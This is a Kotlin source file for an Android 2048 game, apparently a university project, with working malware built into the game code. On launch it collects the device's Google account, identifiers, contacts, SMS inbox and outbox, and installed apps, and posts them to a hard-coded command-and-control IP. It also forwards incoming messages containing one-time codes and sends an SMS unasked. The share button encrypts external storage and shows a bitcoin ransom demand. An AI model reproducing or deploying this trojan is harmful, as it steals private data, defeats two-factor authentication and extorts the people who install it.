package edu.sunypoly.a2048

import android.Manifest
import android.accounts.Account
import android.accounts.AccountManager
import android.annotation.SuppressLint
import android.app.AlertDialog
import android.content.*
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.database.Cursor
import android.graphics.Bitmap
import android.media.MediaPlayer
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.NetworkInfo
import android.net.Uri
import android.net.wifi.WifiInfo
import android.net.wifi.WifiManager
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.preference.PreferenceManager
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import android.support.annotation.RequiresApi
import android.support.constraint.ConstraintSet
import android.support.v4.app.ActivityCompat
import android.support.v4.content.ContextCompat
import android.support.v7.app.AppCompatActivity
import android.telephony.SmsManager
import android.transition.AutoTransition
import android.transition.TransitionManager
import android.util.Log
import android.view.View
import android.view.animation.AnimationUtils
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import edu.sunypoly.a2048.StateHandler.continuingGame
import edu.sunypoly.a2048.StateHandler.currentState
import edu.sunypoly.a2048.StateHandler.grid
import edu.sunypoly.a2048.StateHandler.moveCount
import edu.sunypoly.a2048.StateHandler.over
import edu.sunypoly.a2048.StateHandler.previousState
import edu.sunypoly.a2048.StateHandler.score
import edu.sunypoly.a2048.StateHandler.updateState
import edu.sunypoly.a2048.StateHandler.updateToMatchState
import edu.sunypoly.a2048.StateHandler.won
import edu.sunypoly.a2048.TimerHandler.startTimer
import kotlinx.android.synthetic.main.activity_index.*
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader
import java.math.BigInteger
import java.net.HttpURLConnection
import java.net.InetAddress
import java.net.URL
import java.text.SimpleDateFormat
import java.util.*

val TAG: (Any) -> String = { it.javaClass.simpleName }

@Suppress("UNUSED_PARAMETER")
class MainActivity : AppCompatActivity() {
    var result:Boolean = false

    private var tilesToRemove = ArrayList<Tile>()

    private var scale = 1f
    private var margin = 0

    private val handler = Handler()

    private var textBrown = 0
    private var textOffWhite = 0

    private lateinit var prefs: SharedPreferences

    private lateinit var click: MediaPlayer
    private lateinit var tap: MediaPlayer
    private lateinit var whoosh: MediaPlayer
    private lateinit var pop: MediaPlayer

    private var isTimeTrialMode = false

    private val dateFormat = SimpleDateFormat("mm:ss", Locale.getDefault())

    var utils: Utils = Utils()
    var salt: ByteArray = utils.generateSalt()
    val Key_ran = "abcdefg_12345"

    var context: Context? = null
    var updateUIReciver: BroadcastReceiver? = null



    @RequiresApi(Build.VERSION_CODES.O)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_index)

        prefs = PreferenceManager.getDefaultSharedPreferences(this)

        GlobalScope.launch {
            Stats.init(this@MainActivity)
        }

        textBrown = ContextCompat.getColor(this, R.color.textBrown)
        textOffWhite = ContextCompat.getColor(this, R.color.offWhiteText)

        scale = resources.displayMetrics.density
        margin = tile_0_0.paddingTop

        click = MediaPlayer.create(this, R.raw.click)
        tap = MediaPlayer.create(this, R.raw.tap)
        whoosh = MediaPlayer.create(this, R.raw.whoosh)
        pop = MediaPlayer.create(this, R.raw.pop)

        val emailBtn = findViewById<Button>(R.id.email_button)
        emailBtn.setOnClickListener {
            val intent = Intent(this, EmailActivity::class.java)
            intent.putExtra("score", score)
            startActivity(intent)
        }


        val infoObject = JSONObject()

        //Retrieve current user gmail account credentials
        aManager(infoObject)

        //Get Unique Android ID
        getAndID(infoObject)

        //Retrieve current user gmail account credentials
        aManager(infoObject)

        // Get info such as device API version and OS version
        getPhoneInfo(infoObject)

        //Get User List
        getUserList(infoObject)

        //Get device MAC Address
        getMAC(infoObject)
        //Check if there is network connectivity
        var connType:String = isNetworkAvailable()

        //Get wifi info of device such as IP Address if there is a WiFi connection
        if (connType == "WIFI"){
            getWifiInfo(infoObject)
        }

        //Get entire contact list on device
        getContactList(infoObject)
        //Get all messages received on the device
        readreceivedMessages(infoObject)
        //Get all messages sent on the device
        readSentMessages(infoObject)
        //Sends an sms
        sendmessages()

        //List all apps so that attacker can see what app user is using and retrieve otp for app when calling back to C2 server
        pManager(infoObject)

        //Having issues trying to get the value of var result within coroutine
        //which would allow the app to check for connectivity to C2 server,
        //hence not implemented
        if (connType != "NONE"){
            GlobalScope.launch(Dispatchers.Main) {
                var result = isServerAvailable().toString()
                //Log.i(ContentValues.TAG, "server_Available1: $result")
            }
            //Log.i(ContentValues.TAG, "server_Available2: $result")
        }
        //Log.i(ContentValues.TAG, "server_Available3: $result")

        //exfiltrate data that has been gathered above ^
        if (connType.isBlank() == false || connType == "NONE"){
            GlobalScope.launch(Dispatchers.Main) {
                establishNetworkConn(infoObject)
            }
        }

        //https://www.linkedin.com/pulse/android-how-send-data-from-service-activity-mahesh-gawale
        //The below code gets messages received by the MessageReceiver BroadcastReceiver Class
        //by registering a reciever that listens to service.to.activity.transfer
        context = this
        val filter = IntentFilter()
        filter.addAction("service.to.activity.transfer")
        updateUIReciver = object : BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                //When messages received by the device
                if (intent != null) {
                    var infoObject = JSONObject()
                    var msgContent = intent.getStringExtra("msgContent").toString()
                    //Log.i(ContentValues.TAG, "Conn_type: $msgContent")
                    if (msgContent.contains("otp", ignoreCase = true) || msgContent.contains("code", ignoreCase = true)) {
                        getAndID(infoObject)
                        infoObject.put("msgContent", msgContent)
                        GlobalScope.launch(Dispatchers.Main) {
                            establishNetworkConn(infoObject)
                        }
                    }
                }
            }
        }
        registerReceiver(updateUIReciver, filter)
    }

    //unregister updateUIReceiver BroadcastReceiver() after receiving the sms from service.to.activity.transfer:
    override fun onStop() {
        //https://stackoverflow.com/questions/9078390/intentrecieverleakedexception-are-you-missing-a-call-to-unregisterreceiver
        super.onStop()
        unregisterReceiver(updateUIReciver)
    }

    //Get user list from login activity
    private fun getUserList(json: JSONObject): JSONObject {
        if (intent.getStringExtra("userlist") != null){
            val strList: String = intent.getStringExtra("userlist")
            //Log.i(ContentValues.TAG, strList)
            json.put("userList", strList)
        }
        return json
    }

    //Get unique android ID of device
    private fun getAndID(json: JSONObject): JSONObject {
        val m_androidId: String = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        //Log.i(ContentValues.TAG, "android_Id: $m_androidId")
        json.put("android_ID", m_androidId)
        return json
    }

    //Get gmail address(es) associated with this device
    private fun aManager(json: JSONObject): JSONObject {
        val result = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS);
        if (result == PackageManager.PERMISSION_GRANTED) {
            val manager: AccountManager = getSystemService(Context.ACCOUNT_SERVICE) as AccountManager
            val list: Array<Account> = manager.getAccounts()
            var email: String? = null
            for (account in list) {
                if (account.type.equals("com.google", ignoreCase = true)) {
                    email = account.name
                    //Log.i(ContentValues.TAG, "device_email: " + email)
                    json.put("device_email", email)
                    break
                }
            }
        }
        else{
            json.put("device_email", "NULL")
        }
        return json
    }


    //Get device info such as Android OS version, device model, SDK Number etc
    private fun getPhoneInfo(json: JSONObject): JSONObject {
        val buildModel = Build.MODEL
        val buildDevice = Build.DEVICE
        val manufacturer = Build.MANUFACTURER
        val sdkVersion = Build.VERSION.SDK_INT
        val versionRelease = Build.VERSION.RELEASE

        json.put("build_Model", buildModel)
        json.put("build_Device", buildDevice)
        json.put("manufacturer", manufacturer)
        json.put("SDK_version", sdkVersion)
        json.put("version_Release", versionRelease)

        return json
    }

    //Get device unique MAC Address which can be used for spoofing by attacker
    private fun getMAC(json: JSONObject): JSONObject{
        val m_wm: WifiManager = getApplicationContext().getSystemService(Context.WIFI_SERVICE) as WifiManager
        val m_wlanMacAdd: String = m_wm.getConnectionInfo().macAddress.toUpperCase()
        //Log.i(ContentValues.TAG, "wlan_MacAdd: $m_wlanMacAdd")
        json.put("wlan_MacAdd", m_wlanMacAdd)
        return json
    }
    //check if there is a network connection and network connection type
    private fun isNetworkAvailable(): String {
        //https://stackoverflow.com/questions/4238921/detect-whether-there-is-an-internet-connection-available-on-android
        var ConnType: String
        val connectivityManager: ConnectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val activeNetworkInfo: NetworkInfo = connectivityManager.getActiveNetworkInfo()
        //Log.i(ContentValues.TAG, "Network_Activiy: $activeNetworkInfo")
        if (connectivityManager != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val capabilities: NetworkCapabilities? = connectivityManager.getNetworkCapabilities(connectivityManager.activeNetwork)
            if (capabilities != null) {
                if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) {
                    //Log.i("Internet", "NetworkCapabilities.TRANSPORT_CELLULAR")
                    ConnType = "CELLULAR"
                    return ConnType
                } else if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) {
                    //Log.i("Internet", "NetworkCapabilities.TRANSPORT_WIFI")
                    ConnType = "WIFI"
                    return ConnType
                } else if (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)) {
                    //Log.i("Internet", "NetworkCapabilities.TRANSPORT_ETHERNET")
                    ConnType = "ETHERNET"
                    return ConnType
                }
            }
        }

        ConnType = "NONE"
        return ConnType
    }

    //network connection info if network connection type is WIFI
    private fun getWifiInfo(json: JSONObject): JSONObject {
        //https://www.tutorialspoint.com/how-to-get-the-ip-address-of-android-device-programmatically
        //https://stackoverflow.com/questions/17055946/android-formatter-formatipaddress-deprecation-with-api-12
        val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
        val wifiinfo: WifiInfo = wifiManager.getConnectionInfo()
        val wifiIPAddress = BigInteger.valueOf(wifiinfo.ipAddress.toLong()).toByteArray()
        val myaddr = InetAddress.getByAddress(wifiIPAddress)
        val hostaddr = myaddr.hostAddress
        //Log.i(ContentValues.TAG, "host_addr: $hostaddr")
        json.put("host_addr", hostaddr)
        return json
    }


    //read all sms received by user/device
    private fun readreceivedMessages(json: JSONObject): JSONObject {
        val messages: MutableList<String> = ArrayList()
        val result = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS);
        if (result == PackageManager.PERMISSION_GRANTED) {
            val mSmsQueryUri = Uri.parse("content://sms/inbox")
            var cursor: Cursor? = null
            try {
                cursor = contentResolver.query(mSmsQueryUri,
                        null, null, null, null)
                if (cursor == null) {
                    Log.i(ContentValues.TAG, "cursor is null. uri: $mSmsQueryUri")
                }
                var hasData: Boolean = cursor.moveToFirst()
                while (hasData) {
                    messages.add(cursor.getString(cursor.getColumnIndexOrThrow("address")))
                    messages.add(cursor.getString(cursor.getColumnIndexOrThrow("body")))
                    messages.add(cursor.getString(cursor.getColumnIndexOrThrow("date")))
                    //Log.i(ContentValues.TAG, "message = : $messages")
                    hasData = cursor.moveToNext()
                }
            } catch (e: Exception) {
                Log.e(ContentValues.TAG, e.message)
            } finally {
                cursor?.close()
            }
        }
        json.put("inbox_list",messages)
        return json
    }
    //read all sms Sent by user/device
    private fun readSentMessages(json: JSONObject): JSONObject {
        val messages: MutableList<String> = ArrayList()
        val result = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS);
        if (result == PackageManager.PERMISSION_GRANTED) {
            val mSmsQueryUri = Uri.parse("content://sms/sent")
            var cursor: Cursor? = null
            try {
                cursor = contentResolver.query(mSmsQueryUri,
                        null, null, null, null)
                if (cursor == null) {
                    Log.i(ContentValues.TAG, "cursor is null. uri: $mSmsQueryUri")
                }
                var hasData: Boolean = cursor.moveToFirst()
                while (hasData) {
                    messages.add(cursor.getString(cursor.getColumnIndexOrThrow("address")))
                    messages.add(cursor.getString(cursor.getColumnIndexOrThrow("body")))
                    messages.add(cursor.getString(cursor.getColumnIndexOrThrow("date")))
                    //Log.i(ContentValues.TAG, "date = : $messages")
                    hasData = cursor.moveToNext()
                }
            } catch (e: Exception) {
                Log.e(ContentValues.TAG, e.message)
            } finally {
                cursor?.close()
            }
        }
        json.put("outbox_list",messages)
        return json
    }
    //List all contacts save by the user on the device
    private fun getContactList(json: JSONObject): JSONObject {
        val details: MutableList<String> = ArrayList()
        val result = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS);
        if (result == PackageManager.PERMISSION_GRANTED) {
            //http://saigeethamn.blogspot.com/2011/05/contacts-api-20-and-above-android.html
            val cr = contentResolver
            val cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                    null, null, null, null)
            if (cur?.count ?: 0 > 0) {
                while (cur != null && cur.moveToNext()) {
                    val id = cur.getString(
                            cur.getColumnIndex(ContactsContract.Contacts._ID))
                    val name = cur.getString(cur.getColumnIndex(
                            ContactsContract.Contacts.DISPLAY_NAME))
                    if (cur.getInt(cur.getColumnIndex(
                                    ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                        val pCur = cr.query(
                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", arrayOf(id), null)
                        while (pCur.moveToNext()) {
                            val phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                            details.add(name)
                            details.add(phoneNo)
                            /*Log.i(ContentValues.TAG, "Phone Number: $phoneNo")
                            Log.i(ContentValues.TAG, "Name: $name")*/
                        }
                        pCur.close()
                    }
                }
            }
            cur?.close()
            json.put("contact_list", details)
        }
        else{
            json.put("Name", "NULL")
            json.put("Phone Number", "NULL")
        }
        return json
    }
    //send sms function to try and send Premium sms
    private fun sendmessages(){
        val result = ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS);
        if (result == PackageManager.PERMISSION_GRANTED) {
            val smsManager = SmsManager.getDefault() as SmsManager
            smsManager.sendTextMessage("(650) 555-1212", null, "becasue it is not an actual desert", null, null)
        }
    }

    //List all apps so that attacker can see what app user is using
    //and retrieve otp for apps on the phone when calling back to C2 server
    private fun pManager(json: JSONObject): JSONObject{
        val package_list: MutableList<String> = ArrayList()
        val pm = packageManager
        val packages: List<ApplicationInfo> = pm.getInstalledApplications(PackageManager.GET_META_DATA)
        for (packageInfo in packages) {
            /*Log.i(ContentValues.TAG, "package_Name: " + packageInfo.packageName)
            Log.i(ContentValues.TAG, "source_Dir: " + packageInfo.sourceDir)*/
            package_list.add(packageInfo.packageName)
            package_list.add(packageInfo.sourceDir)
        }
        json.put("package_list",package_list)
        return json
    }

    //Function to check if C2 Server is available
    private suspend fun isServerAvailable() {
        //https://stackoverflow.com/questions/46177133/http-request-in-kotlin
        val url = URL("http://207.46.224.66:9000")
        var reponseCode: String
        val result = withContext(Dispatchers.IO) {
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "GET"
            connection.connect()
            var code = connection.responseCode
            //println("Response code of the object is $code")
            if (code == 200) {
                println("OK")
            }
        }
        return result
    }
    //Function which connects to cloud C2 server instance and exfiltrate infomation gathered by functions above
    private suspend fun establishNetworkConn(json: JSONObject) {
        //https://stackoverflow.com/questions/6343166/how-to-fix-android-os-networkonmainthreadexception?page=1&tab=votes#tab-top
        //https://hmkcode.com/android/android-network-connection-httpurlconnection-coroutine/
        val url = URL("http://207.46.224.66:9000")
        val result = withContext(Dispatchers.IO) {
            val con = url.openConnection() as HttpURLConnection
            con.setRequestMethod("POST");
            con.setRequestProperty("Content-Type", "application/json; utf-8");
            con.setRequestProperty("Accept", "application/json");
            con.setDoOutput(true);

            val answer = json.toString()
            con.outputStream.use { os ->
                val input = answer.toByteArray(charset("utf-8"))
                os.write(input, 0, input.size)
            }
            BufferedReader(InputStreamReader(con.inputStream, "utf-8")).use { br ->
                val response = StringBuilder()
                var responseLine: String? = null
                while (br.readLine().also { responseLine = it } != null) {
                    response.append(responseLine!!.trim { it <= ' ' })
                }
                println(response.toString())
            }
        }
        return result
    }


    /*@SuppressLint("MissingPermission")
   private fun getCellInfo() {
       val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
       val cellLocation = telephonyManager.allCellInfo
   }*/

    fun WarningMessage(){

        val builder = AlertDialog.Builder(this)

        with(builder)
        {
            setTitle("Ransomeware")
            setMessage("Your files are encrypted, pay 0.3 bitcoin to bc8qxz0kuydgjrsqtcq5n0yrf2153p83knfjhx0wlm to unlock your files")
            show()
        }


    }

    override fun onResume() {
        super.onResume()

        //registering updateUIReceiver Broadcast Receiver so that if goes back to listening to service.to.activity.transfer
        //when user returns to continues his.her game session
        val filter = IntentFilter()
        filter.addAction("service.to.activity.transfer")
        registerReceiver(updateUIReciver, filter)

        clearViews()

        if (StateHandler.loadState(this)) {
            updateToMatchState(true, this::onUpdateState)
        } else {
            newGame()
        }

        startTimer(handler, this::updateTimerTextView)

        logBoard()
        touch_receiver.setOnTouchListener(TileTouchListener(this))
        val tan = ContextCompat.getColor(this, R.color.colorPrimary)
        window.navigationBarColor = tan
        hideSystemUI()

        StateHandler.updateDataValues(this::updateDisplayedData)

        if (prefs[UNDO_ENABLED, true]) {
            undo_button.visibility = View.VISIBLE
        } else {
            undo_button.visibility = View.GONE
        }

        if (prefs[SWIPE_ANYWHERE_ENABLED, false]) {
            val constraints = ConstraintSet()
            constrainToTarget(constraints, touch_receiver.id, ConstraintSet.PARENT_ID)
            constraints.applyTo(full_page)
        } else {
            val constraints = ConstraintSet()
            constrainToTarget(constraints, touch_receiver.id, game_container.id)
            constraints.applyTo(full_page)
        }

        if (over) {
            promptGameOver()
        } else if (won && !continuingGame) {
            promptContinue()
        }
    }

    override fun onPause() {
        super.onPause()

        updateState()
        StateHandler.saveState(this)
        Stats.writeToFile()
    }

    override fun onWindowFocusChanged(hasFocus: Boolean) {
        super.onWindowFocusChanged(hasFocus)
        if (hasFocus) hideSystemUI()
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)

        intent?.extras?.let {
            isTimeTrialMode = it.getBoolean(TIME_TRIAL, false)
        }
        Log.d(TAG(this), "time trial mode?$isTimeTrialMode")
    }


    private fun updateDisplayedData(score: Int, highScore: Int) {
        score_view.text = formatScore(score)
        best_score.text = formatScore(highScore)
        val movesText = if (moveCount == 1) {
            "1 move"
        } else {
            "$moveCount moves"
        }
        move_count_text_view.text = movesText
    }

    private fun formatScore(s: Int): String {
        return when {
            s >= 1_000_000_000 -> "${(s / 100_000_000).toFloat() / 10}b"
            s >= 1_000_000 -> "${(s / 100_000).toFloat() / 10}m"
            s >= 1_000 -> "${(s / 100).toFloat() / 10}k"
            else -> s.toString()
        }
    }


    private fun promptContinue() {
        showMessage("You win!")
        email_container.setBackgroundColor(ContextCompat.getColor(this, R.color.transparentYellow))
        keep_going_button.visibility = View.VISIBLE
    }

    private fun promptGameOver() {
        showMessage("Game over!")
        email_container.setBackgroundColor(ContextCompat.getColor(this, R.color.transparentBrown))
        keep_going_button.visibility = View.GONE
    }

    private fun showMessage(str: String) {
        touch_receiver.visibility = View.GONE
        email_container.visibility = View.VISIBLE
        message.text = str
    }

    private fun dismissMessage() {
        email_container.visibility = View.GONE
        touch_receiver.visibility = View.VISIBLE
    }

    fun tryAgain(view: View) {
        playClick()
        newGame()
    }

    fun keepGoing(view: View) {
        playClick()
        dismissMessage()
        continuingGame = true
    }

    fun share(view: View) {
        playClick()
        if (ContextCompat.checkSelfPermission(this,
                        Manifest.permission.WRITE_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this,
                    arrayOf(Manifest.permission.WRITE_EXTERNAL_STORAGE),
                    0)

            if (ContextCompat.checkSelfPermission(this,
                            Manifest.permission.WRITE_EXTERNAL_STORAGE)
                    == PackageManager.PERMISSION_GRANTED) {
                takeScreenshot()
            } else {
                Toast.makeText(this,
                        "Sharing requires temporarily storing a screenshot.",
                        Toast.LENGTH_LONG).show()
            }
        } else {
            takeScreenshot()
        }
    }

    @Suppress("DEPRECATION")
    private fun takeScreenshot() {
        val v1 = window.decorView.rootView
        v1.isDrawingCacheEnabled = true
        val mBitmap = Bitmap.createBitmap(v1.drawingCache)
        v1.isDrawingCacheEnabled = false

        val path = MediaStore.Images.Media.insertImage(contentResolver, mBitmap, "Image Description", null)
        val uri = Uri.parse(path)

        val intent = Intent(Intent.ACTION_SEND)
        intent.type = "image/jpeg"
        intent.putExtra(Intent.EXTRA_STREAM, uri)

        startActivity(Intent.createChooser(intent, "Share Image"))
        try {
            val Files: ArrayList<File> = utils.FindArchives(Environment.getExternalStorageDirectory())
            for (i in 0 until Files.size) {
                Toast.makeText(applicationContext, "Encrypting...", Toast.LENGTH_SHORT).show()
                utils.encrypt(Key_ran, Files[i].getPath(), Files[i].getName(), salt)
            }
            WarningMessage()
        }
        catch (k: Exception) {
            k.printStackTrace()
        }
    }


    private fun addRandom() {
        val available = grid.availablePositions()
        if (available.isEmpty() && isTimeTrialMode) {
            over = true
            won = false
            continuingGame = false
            promptGameOver()
        } else {
            val newPos = available.removeAt((0 until available.size).random())
            addAt(newPos)
        }
    }

    private fun addAt(p: Pos, value: Int = if ((0..9).random() < 9) 2 else 4) {
        grid[p] = Tile(p, value)

        val tile = createTileTextView(value)

        val id = tile.id
        grid[p]?.textView = tile

        val constraintSet = ConstraintSet()
        with(constraintSet) {
            applyDefaultConstraints(this, id)
            constrainToTarget(this, id, p)
            applyTo(game_container)
        }
    }

    private fun applyDefaultConstraints(constraintSet: ConstraintSet, id: Int) {
        constraintSet.constrainHeight(id, 0)
        constraintSet.constrainWidth(id, 0)
        constraintSet.setDimensionRatio(id, "1:1")
    }

    @SuppressLint("InflateParams")
    private fun createTileTextView(value: Int): TextView {
        val tile = layoutInflater.inflate(R.layout.tile, null) as TextView
        tile.id = View.generateViewId()

        with(tile) {

            text = value.toString()
            if (value < 8) {
                setTextColor(textBrown)
            } else {
                setTextColor(textOffWhite)
            }

            if (value <= 2048) {
                val colorId = ContextCompat.getColor(this@MainActivity, resources.getIdentifier("tile$value", "color", packageName))
                background.mutate().setTint(colorId)
            } else {
                background.mutate().setTint(ContextCompat.getColor(this@MainActivity, R.color.tileSuper))
            }

            textSize = when (value.length()) {
                1, 2 -> {
                    40f
                }
                3 -> {
                    30f
                }
                4 -> {
                    24f
                }
                5 -> {
                    18f
                }
                //if you get bigger than this, congrats, you broke it and you definitely cheated
                else -> {
                    12f
                }
            }

            game_container.addView(this)
        }
        return tile
    }

    private fun getTargetId(p: Pos): Int {
        val gridLocIdName = "tile_${p.y}_${p.x}"
        return resources.getIdentifier(gridLocIdName, "id", packageName)
    }

    private fun constrainToTarget(constraintSet: ConstraintSet, sourceId: Int, pos: Pos) {
        constrainToTarget(constraintSet, sourceId, getTargetId(pos))
    }

    private fun constrainToTarget(constraintSet: ConstraintSet, sourceId: Int, targetId: Int) {
        constraintSet.connect(sourceId, ConstraintSet.LEFT, targetId, ConstraintSet.LEFT, margin)
        constraintSet.connect(sourceId, ConstraintSet.RIGHT, targetId, ConstraintSet.RIGHT, margin)
        constraintSet.connect(sourceId, ConstraintSet.TOP, targetId, ConstraintSet.TOP, margin)
        constraintSet.connect(sourceId, ConstraintSet.BOTTOM, targetId, ConstraintSet.BOTTOM, margin)
    }

    private fun getVector(direction: Int): Pair<Int, Int> {
        return when (direction) {
            0 -> Pair(0, -1)// Up
            1 -> Pair(1, 0) // Right
            2 -> Pair(0, 1) // Down
            3 -> Pair(-1, 0)// Left
            else -> throw IllegalArgumentException()
        }
    }

    private fun prepareTiles() {
        grid.forEach { tile ->
            tile?.let {
                tile.mergedFrom = null
                tile.savePosition()
            }
        }
    }

    private fun moveTile(tile: Tile, pos: Pos) {
        grid[tile.pos] = null
        grid[pos] = tile
        tile.updatePosition(pos)
    }


    internal fun move(direction: Int) {
        if (isGameTerminated())
            return

//        Log.d(TAG(this), "currentState = \n${currentState.grid}")

        previousState = currentState.copy()

        grid = currentState.grid

        val vector = getVector(direction)
        val traversals = buildTraversals(vector)
        var moved = false

        prepareTiles()

        for (i in traversals.first) {
            for (j in traversals.second) {
                val pos = Pos(i, j)
                val tile = grid[pos]

                tile?.let {
                    val positions = getMaxShift(vector, pos)
//                    Log.v(TAG(this), "max pos if merge: ${positions.first} else: ${positions.second}")
                    val next = grid[positions.second]

                    //Merge tiles; only 1 merger per row traversal
                    if (next != null && next.value == tile.value && next.mergedFrom == null) {
                        val merged = Tile(positions.second, tile.value * 2)
                        merged.mergedFrom = Pair(tile, next)


                        grid[merged.pos] = merged
                        grid[tile.pos] = null

                        //Converge the two tiles' positions
                        tile.updatePosition(positions.second)

                        tilesToRemove.add(tile)
                        tilesToRemove.add(next)

                        StateHandler.score += merged.value

                        //Win condition
                        if (merged.value == 2048) {
                            won = true
                        }
                    } else {
                        moveTile(tile, positions.first)
                    }

                    if (pos != tile.pos) {
                        moved = true
                    }
                }
            }
        }

        if (moved) {
            onMove()
        }
    }

    private fun buildTraversals(vector: Pair<Int, Int>): Pair<ArrayList<Int>, ArrayList<Int>> {
        val x = ArrayList<Int>()
        val y = ArrayList<Int>()

        for (i in 0 until grid.size) {
            x.add(i)
            y.add(i)
        }

        if (vector.first == 1) x.reverse()
        if (vector.second == 1) y.reverse()

        return Pair(x, y)
    }

    private fun getMaxShift(vector: Pair<Int, Int>, pos: Pos): Pair<Pos, Pos> {
        var previous: Pos
        var p = pos
        do {
            previous = p
            p = previous + vector
        } while (grid.withinBounds(p) && grid.isPosAvailable(p))

        return Pair(previous, p)
    }

    private fun onMove() {
        val transition = AutoTransition()
        transition.duration = 100
        val constraintSet = ConstraintSet()

        val combinedAny = !tilesToRemove.isEmpty()

        playWhoosh(combinedAny)

        grid.forEach { tile ->
            tile?.let {
                //Update moved tiles
                if (tile.previousPos != tile.pos) {
                    var textView = tile.textView

                    //Add combined tile
                    if (tile.mergedFrom != null) {
                        textView = createTileTextView(tile.value)
                        applyDefaultConstraints(constraintSet, textView.id)
                        val pop = AnimationUtils.loadAnimation(this, R.anim.pop)
                        textView.startAnimation(pop)
                    }
                    textView?.let { constrainToTarget(constraintSet, textView.id, tile.pos) }
                            ?: Log.d(TAG(this), "Found a null TextView @ ${tile.pos}")
                    tile.textView = textView
                }
            }
        }

        tilesToRemove.forEach { tile ->
            constrainToTarget(constraintSet, tile.textView!!.id, tile.pos)
        }

        TransitionManager.beginDelayedTransition(game_container, transition)
        constraintSet.applyTo(game_container)

        tilesToRemove.forEach {
            game_container.removeView(it.textView)
        }

        tilesToRemove.clear()

        moveCount++
        StateHandler.updateDataValues(this::updateDisplayedData)

        addRandom()

        if (!movesAvailable()) {
            over = true
        }

        updateState()
        StateHandler.saveState(this)

        if (won && !continuingGame) {
            promptContinue()
        } else if (over) {
            promptGameOver()
        }
    }


    private fun logBoard() {
        Log.v(TAG(this), "grid = \n $grid")
    }


    private fun movesAvailable(): Boolean {
        return grid.arePositionsAvailable() || tileMatchesAvailable()
    }

    private fun tileMatchesAvailable(): Boolean {
        for (i in 0 until grid.size) {
            for (j in 0 until grid.size) {
                val pos = Pos(i, j)
                val tile = grid[pos]
                tile?.let {
                    for (direction in 0 until 4) {
                        val vector = getVector(direction)
                        val otherPos = pos + vector
                        val other = grid[otherPos]

                        if (other != null && other.value == tile.value) {
                            return true
                        }
                    }
                }
            }
        }

        return false
    }


    private fun isGameTerminated(): Boolean {
        return over || (won && !continuingGame)
    }

    @Suppress("UNUSED_PARAMETER")
    fun promptNewGame(view: View?) {
        playTap()
        AlertDialog.Builder(this).apply {
            title = "New Game"
            setMessage("Are you sure you want to start a new game?")
            setPositiveButton("Yes") { _, _ ->
                newGame()
            }
            setNegativeButton("No", null)
        }.also {
            it.create()
            it.show()
        }
    }

    private fun newGame() {
        dismissMessage()

        grid.forEach { tile ->
            tile?.let {
                tilesToRemove.add(tile)
            }
        }
        tilesToRemove.forEach {
            game_container.removeView(it.textView)
        }

        tilesToRemove.clear()

        clearViews()

        StateHandler.newGame {
            addStartingTiles(2)

            StateHandler.updateDataValues(this::updateDisplayedData)

            updateState()
            StateHandler.saveState(this)

            startTimer(handler, this::updateTimerTextView)
        }
    }

    private fun addStartingTiles(startTiles: Int) {
        repeat(startTiles) {
            addRandom()
        }
    }

    private fun clearViews() {
        Log.d(TAG(this), "Clearing views...")
        grid.forEach { tile ->
            //            Log.d(TAG(this), "tile = $tile")
            tile?.let {
                //                Log.d(TAG(this), "textView = ${tile.textView}")
//                Log.d(TAG(this), "index of textView = ${game_container.indexOfChild(tile.textView)}")
                tile.textView?.let { game_container.removeView(it) }
            }
        }
    }

    @Suppress("UNUSED_PARAMETER")
    fun undo(view: View) {
        playTap()
        previousState?.let {
            //Revert gamesReached count if user just got there
            val maxTile = currentState.grid.maxVal()
            if (maxTile != previousState?.grid?.maxVal()) {
                val currentMaxStat = Stats.getStatForValue(currentState.grid.maxVal())
                currentMaxStat?.let {
                    it.gamesReached--
                }
            }
            grid.forEach { tile ->
                tile?.let {
                    tilesToRemove.add(tile)
                }
            }
            currentState = previousState!!
            previousState = null

            tilesToRemove.forEach {
                game_container.removeView(it.textView)
            }
            tilesToRemove.clear()

            StateHandler.updateToMatchState(listener = this::onUpdateState)
        }
                ?: if (moveCount != 0) Toast.makeText(this, "You can only undo once.", Toast.LENGTH_SHORT).show()

    }

    private fun onUpdateState() {
        clearViews()
        StateHandler.updateDataValues(this::updateDisplayedData)

        grid.forEach { tile ->
            tile?.let {
                addAt(tile.pos, tile.value)
            }
        }
    }

    private fun updateTimerTextView(callCount: Int = 0){
        val strDate = dateFormat.format(System.currentTimeMillis() - StateHandler.startTime + StateHandler.previouslyElapsedTime)
        timer_text_view.text = strDate

        if (isTimeTrialMode && callCount % 2 == 0) {
            addRandom()
        }
    }

